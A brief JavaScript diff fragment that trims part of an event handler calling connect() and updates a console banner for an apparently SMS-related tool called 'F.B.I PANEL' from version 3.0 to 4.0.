-    var setup = document.getElementById('setup');
-    if(setup && setup.style.display !== 'none') connect();
-  }
-});
-
-console.log('%c[F.B.I PANEL] v3.0 ⚡ SUB-SECOND SMS · ZERO DUPLICATES', 'color:#a855f7;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I PANEL] v4.0 ⚡ CACHE-FREE FAST BOOT · ACTIVE-DEVICE LOCK', 'color:#a855f7;font-weight:bold;font-size:14px');
